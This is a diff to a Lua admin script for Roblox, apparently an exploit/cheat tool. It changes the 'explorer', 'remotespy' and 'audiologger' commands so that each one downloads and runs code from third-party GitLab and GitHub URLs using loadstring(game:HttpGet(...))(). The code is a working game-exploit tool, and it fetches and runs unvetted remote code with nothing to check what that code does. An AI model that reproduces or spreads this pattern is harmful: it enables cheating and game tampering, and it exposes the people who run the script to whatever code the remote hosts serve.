@@ -9482,56 +9482,20 @@ end)
 
 addcmd('explorer',{'dex'},function(args, speaker)
 	notify("Loading",'Hold on a sec')
-	local Dex = game:GetObjects("rbxassetid://3567096419")[1]
-	Dex.Parent = PARENT
-
-	local function Load(Obj, Url)
-		local function GiveOwnGlobals(Func, Script)
-			local Fenv = {}
-			local RealFenv = {script = Script}
-			local FenvMt = {}
-			FenvMt.__index = function(a,b)
-				if RealFenv[b] == nil then
-					return getfenv()[b]
-				else
-					return RealFenv[b]
-				end
-			end
-			FenvMt.__newindex = function(a, b, c)
-				if RealFenv[b] == nil then
-					getfenv()[b] = c
-				else
-					RealFenv[b] = c
-				end
-			end
-			setmetatable(Fenv, FenvMt)
-			setfenv(Func, Fenv)
-			return Func
-		end
-		local function LoadScripts(Script)
-			if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
-				spawn(function()
-					GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script)()
-				end)
-			end
-			for i,v in pairs(Script:GetChildren()) do
-				LoadScripts(v)
-			end
-		end
-		LoadScripts(Obj)
-	end
-
-	Load(Dex)
+    local function LoadDex(url)
+        loadstring(game:HttpGet(url))()
+    end
+    LoadDex('https://gitlab.com/legohackingroblox/helios/-/raw/main/DarkDexV2')
 end)
 
 addcmd('remotespy',{'rspy'},function(args, speaker)
 	notify("Loading",'Hold on a sec')
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nootchtai/FrostHook_Spy/master/Spy.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/welcomewelcome334/ssi/refs/heads/main/RemoteSpy.lua"))()
 end)
 
 addcmd('audiologger',{'alogger'},function(args, speaker)
 	notify("Loading",'Hold on a sec')
-	loadstring(game:HttpGet(('https://pastebin.com/raw/GmbrsEjM'),true))()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/refs/heads/main/audiologger.lua'),true))()
 end)
 
 local loopgoto = nil
